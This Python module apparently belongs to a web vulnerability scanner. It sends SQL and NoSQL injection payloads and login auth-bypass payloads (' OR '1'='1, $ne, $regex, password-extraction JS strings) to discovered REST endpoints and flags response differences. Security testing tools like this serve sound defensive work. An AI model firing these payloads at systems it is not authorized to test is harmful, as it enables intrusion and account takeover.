"""
live_rest_validator.py — active REST validation battery.

Turns discovered endpoints into PROVEN findings. Takes the high-value REST
endpoints from JS analysis (login/auth, search, CRUD) and fires a small,
bounded battery of single-shot probes:

  * NoSQL injection  - `'`, `'$ne`, `'] || '' || ['` style on JSON APIs
  * SQL injection    - error-based (`'`, `"`, `' OR '1'='1`) + 500-diff
  * Auth bypass      - login form with injected email/username (opt-in)

Every finding is a BASELINE DIFF: status or body changed vs the no-payload
request, or a server error signature appeared. Nothing mutates state: GET
payloads only; POST only against login/auth endpoints with a single attempt;
no brute force, no data writes, no enumeration.

Results saved as `live_validation_results` by the page.

Config keys (under `rest_validator.*`):
  max_endpoints, max_payloads, timeout, auth_bypass (bool, default True),
  sql_probes, nosql_probes (bool)
"""

import re
import asyncio
from typing import Dict, List, Optional, Callable, Any
from urllib.parse import urlparse, urlencode, parse_qsl

import aiohttp

from app.utils.user_agents import PROGRAM_UA_TAG

logger = __import__('logging').getLogger(__name__)

# Server error signatures that make an injection obvious
_SQLI_SIG = re.compile(
    r"(sql syntax|mysql|postgres|postgresql|sqlite|ORA-|sqlstate|odbc|mariadb|"
    r"pgsql|near \"|near '|sqlalchemy|java\.sql|sqlserver|syntax error at|"
    r"unclosed quotation|unterminated string|mysqli|pg_query|psycopg|"
    r"SqlException|sqlite3\.|pyodbc|division by zero)", re.IGNORECASE)
_NOSQLI_SIG = re.compile(
    r"(cast to objectid failed|invalid objectid|bson|mongo(?:db|db)?(?:error)?|"
    r"objectid|illegal arguments|argumenterror|could not convert|"
    r"\[object Object\]|cowardly refuse|too many positional|"
    r"string contains null|does not allow null bytes|"
    r"unknown operator|can'?t canonicalize|javascript execution failed|"
    r"referenceerror|syntaxerror:.*(?:identifier|unexpected)|"
    r"invalid character '\$'|\$where|failed to parse|expects a string)", re.IGNORECASE)
_AUTH_SIG = re.compile(
    r"(invalid credentials|unauthorized|forbidden|access denied|"
    r"login failed|authentication failed)", re.IGNORECASE)

_QUERY_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR "1"="1',
    "'--",
    "')--",
    # NoSQL: operator / JS-injection forms (corpus-sourced)
    "'$ne",
    "'||'",
    "'] || '' || ['",
    "'%00",
    "$ne",
    "$gt",
    "admin' && this.password[0] == 'a' || 'a'=='b",
    "admin' && this.password.match(/\\d/) || 'a'=='b",
    "$where",
]
# common param names to try on query-less GET endpoints
_COMMON_PARAMS = ['q', 'id', 'name', 'search', 'email', 'query', 'key', 'category']
_LOGIN_PAYLOADS = [
    ("email", "admin' OR '1'='1"),
    ("email", {"$ne": ""}),
    ("email", {"$in": ["admin", "administrator", "superadmin"]}),
    ("email", {"$regex": ".*"}),
    ("email", "admin'--"),
    ("username", "admin' OR '1'='1"),
    ("username", {"$ne": ""}),
    ("username", {"$in": ["admin", "administrator"]}),
    ("username", "admin'--"),
]

_HEADERS = {
    "User-Agent": f"Mozilla/5.0 {PROGRAM_UA_TAG}",
    "Accept": "application/json, text/plain, */*",
}

# endpoint path hints worth probing even without params
_AUTH_HINTS = re.compile(
    r"(login|signin|sign-in|auth|token|reset-password|change-password|"
    r"security-question|sso|session|recovery|forgot|verify|register|signup)", re.I)
_SEARCH_HINTS = re.compile(
    r"(search|filter|query|find|lookup|products?|items?|user[s]?|account|"
    r"order[s]?|basket|cart|feedback|comments?|review)", re.I)


def _parse_params(url: str) -> List[str]:
    try:
        from urllib.parse import parse_qsl
        return [k for k, _ in parse_qsl(urlparse(url).query)]
    except Exception:
        return []


class LiveRestValidator:
    """Bounded, baseline-diff REST injection validation."""

    def __init__(self, config: Dict):
        v = (config or {}).get('rest_validator', {})
        self.timeout = float(v.get('timeout', 8))
        self.max_endpoints = int(v.get('max_endpoints', 40))
        self.max_payloads = int(v.get('max_payloads', 8))
        self.auth_bypass = bool(v.get('auth_bypass', True))
        self.do_sql = bool(v.get('sql_probes', True))
        self.do_nosql = bool(v.get('nosql_probes', True))
        self.last_errors: List[str] = []
        self.session = None  # optional AuthSession - injected into every probe

    # ------------------------------------------------------------------
    # endpoint selection - high-value first
    # ------------------------------------------------------------------
    def _select_endpoints(self, rows: List[Dict], target_host: str = '') -> List[Dict]:
        scored = []
        for row in rows:
            if isinstance(row, str):
                url = row.strip()
                method = 'GET'
            else:
                url = str(row.get('endpoint') or row.get('url') or '').strip()
                method = str(row.get('method') or 'GET').upper()
            if not url.startswith(('http://', 'https://')):
                continue
            # template-literal leftovers ({api_key}) are never real endpoints
            if '{' in url or '}' in url:
                continue
            # keep only the target's own host unless none given
            if target_host:
                try:
                    host = urlparse(url).hostname or ''
                except Exception:
                    continue
                if host != target_host:
                    continue
            if method not in ('GET', 'POST'):
                continue
            if not isinstance(row, str) and \
               str(row.get('soft_404') or '').lower() in ('true', '1'):
                continue
            score = 0
            if _AUTH_HINTS.search(url):
                score += 30
            if _SEARCH_HINTS.search(url):
                score += 20
            if url.lower().endswith(('/api/', '/api')) or '/api/' in url.lower():
                score += 10
            if _parse_params(url):
                score += 10
            if method == 'POST':
                score += 5
            scored.append((score, url, method))
        scored.sort(key=lambda x: -x[0])
        out = [{'endpoint': u, 'method': m} for _, u, m in scored[:self.max_endpoints]]
        self._selected = len(scored)
        return out

    # ------------------------------------------------------------------
    # probes
    # ------------------------------------------------------------------
    async def _probe_get(self, session: aiohttp.ClientSession, url: str,
                         payloads: List[str]) -> List[Dict]:
        findings = []
        # baseline
        base_status, base_body = await self._get(session, url)
        if base_status == 0:
            return findings
        base_body = (base_body or '').lower()

        params = _parse_params(url)
        if not params:
            # no params -> try common param names, then path suffix
            for pname in _COMMON_PARAMS[:4]:
                for p in payloads[:self.max_payloads]:
                    probe_url = self._swap_param(url, pname, p)
                    st, body = await self._get(session, probe_url)
                    body = body or ''
                    sig = _SQLI_SIG.search(body) or _NOSQLI_SIG.search(body)
                    if st == base_status and not sig:
                        continue
                    findings.append(self._row(url, 'GET', pname, p,
                                              base_status, st, body))
            if not findings:
                from urllib.parse import quote as _quote
                for p in payloads[:self.max_payloads]:
                    probe_url = url + ('&' if '?' in url else '?') + 'x=' + _quote(p)
                    st, body = await self._get(session, probe_url)
                    body = body or ''
                    sig = _SQLI_SIG.search(body) or _NOSQLI_SIG.search(body)
                    if st == base_status and not sig:
                        continue
                    findings.append(self._row(url, 'GET', 'path-inject', p,
                                              base_status, st, body))
        else:
            for pname in params[:2]:
                for p in payloads[:self.max_payloads]:
                    probe_url = self._swap_param(url, pname, p)
                    st, body = await self._get(session, probe_url)
                    body = body or ''
                    sig = _SQLI_SIG.search(body) or _NOSQLI_SIG.search(body)
                    if st == base_status and not sig:
                        continue
                    findings.append(self._row(url, 'GET', pname, p,
                                              base_status, st, body))
        return findings

    async def _probe_post_login(self, session: aiohttp.ClientSession,
                                url: str) -> List[Dict]:
        if not self.auth_bypass:
            return []
        findings = []
        base_status, base_body = await self._post_json(session, url,
                                                       {"email": "x", "password": "x"})
        if base_status == 0:
            return findings
        for field, value in _LOGIN_PAYLOADS[:self.max_payloads]:
            body_payload = {field: value, 'password': 'x'}
            st, body = await self._post_json(session, url, body_payload)
            body = body or ''
            # Only signatures NOT present in the baseline body count: the
            # baseline itself says "invalid credentials" on a normal login,
            # so _AUTH_SIG alone is self-referential noise.
            base_sql = _SQLI_SIG.search(base_body) or _NOSQLI_SIG.search(base_body)
            sig = (_SQLI_SIG.search(body) or _NOSQLI_SIG.search(body)) and not base_sql
            # a 200/302 vs the baseline 4xx is an auth bypass signal
            authz = (st in (200, 201, 302) and base_status in (400, 401, 403, 422))
            if st != base_status or sig or authz:
                findings.append(self._row(url, 'POST', field, value,
                                          base_status, st, body, authz))
        return findings

    # ------------------------------------------------------------------
    # helpers
    # ------------------------------------------------------------------
    def _auth_kwargs(self) -> Dict:
        """Merge the optional AuthSession into aiohttp request kwargs."""
        kw: Dict = {}
        if self.session is not None and self.session.authenticated:
            kw['headers'] = {**_HEADERS, **self.session.auth_headers()}
            if self.session.cookies:
                kw['cookies'] = dict(self.session.cookies)
        else:
            kw['headers'] = dict(_HEADERS)
        return kw

    async def _get(self, session, url) -> tuple:
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10),
                                   allow_redirects=False, **self._auth_kwargs()) as r:
                return r.status, (await r.text(errors='ignore'))[:2048]
        except Exception:
            return 0, ''

    async def _post_json(self, session, url, data) -> tuple:
        try:
            async with session.post(url, json=data, timeout=aiohttp.ClientTimeout(total=10),
                                    allow_redirects=False, **self._auth_kwargs()) as r:
                return r.status, (await r.text(errors='ignore'))[:2048]
        except Exception:
            return 0, ''

    @staticmethod
    def _swap_param(url: str, name: str, value: str) -> str:
        p = urlparse(url)
        q = [(k, v) for k, v in parse_qsl(p.query) if k != name]
        q.append((name, value))
        return p._replace(query=urlencode(q)).geturl()

    def _row(self, endpoint: str, method: str, target: str, payload: str,
             base_status: int, probe_status: int, body: str,
             authz: bool = False) -> Dict:
        severity = 'HIGH' if probe_status >= 500 or authz else 'MEDIUM'
        evidence = ''
        for rx in (_SQLI_SIG, _NOSQLI_SIG, _AUTH_SIG):
            m = rx.search(body or '')
            if m:
                evidence = m.group(0)
                break
        return {
            'endpoint': endpoint,
            'method': method,
            'target': target,
            'payload': payload,
            'baseline_status': base_status,
            'probe_status': probe_status,
            'severity': severity,
            'confidence': 'high' if evidence or authz else 'medium',
            'evidence': evidence,
            'note': ('Auth bypass signal: 2xx on injected credentials' if authz
                     else ('Server error on injection' if probe_status >= 500
                           else 'Response diff on injection')),
        }

    # ------------------------------------------------------------------
    # orchestration
    # ------------------------------------------------------------------
    async def _scan_all(self, endpoints: List[Dict],
                        progress_callback=None) -> List[Dict]:
        self.last_errors = []
        results: List[Dict] = []
        conn = aiohttp.TCPConnector(limit=8, ssl=False)
        async with aiohttp.ClientSession(connector=conn) as session:
            total = len(endpoints)
            for idx, ep in enumerate(endpoints):
                url, method = ep['endpoint'], ep['method']
                try:
                    if method == 'GET':
                        results += await self._probe_get(session, url, _QUERY_PAYLOADS)
                    elif method == 'POST' and _AUTH_HINTS.search(url):
                        results += await self._probe_post_login(session, url)
                except Exception as e:
                    self.last_errors.append(f'{url}: {e}')
                if progress_callback:
                    progress_callback((idx + 1) / max(total, 1),
                                      f'Validated {idx + 1}/{total} endpoints')
        # keep only meaningful signals: server error, signature evidence, or
        # auth-bypass status. Bare status flips (401->400) are too noisy.
        meaningful = [r for r in results
                      if r['probe_status'] >= 500 or r['evidence'] or r.get('authz')]
        # collapse to one row per (endpoint, param) - keep the strongest
        # payload, note how many payloads tripped it
        seen = {}
        for r in meaningful:
            key = (r['endpoint'], r['target'])
            if key not in seen:
                seen[key] = r
                seen[key]['extra_payloads'] = 0
            else:
                seen[key]['extra_payloads'] += 1
        unique = list(seen.values())
        unique.sort(key=lambda r: (-(r['probe_status'] >= 500), r['endpoint']))
        return unique

    def scan(self, rows: List[Dict], target_host: str = '',
             session=None,
             progress_callback: Optional[Callable[[float, str], None]] = None
             ) -> List[Dict]:
        """Sync entry: rows = js_discovered_endpoints records (dicts).
        target_host = only validate endpoints on this host (e.g. the target
        domain). session = optional AuthSession; every probe then carries the
        authenticated context (cookies + bearer)."""
        if session is not None:
            self.session = session
        endpoints = self._select_endpoints(rows, target_host)
        if not endpoints:
            return []
        try:
            loop = asyncio.get_running_loop()
        except RuntimeError:
            loop = None
        if loop and loop.is_running():
            import concurrent.futures
            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
                return ex.submit(asyncio.run,
                                 self._scan_all(endpoints, progress_callback)).result()
        return asyncio.run(self._scan_all(endpoints, progress_callback))

    @property
    def selected_count(self) -> int:
        return getattr(self, '_selected', 0)
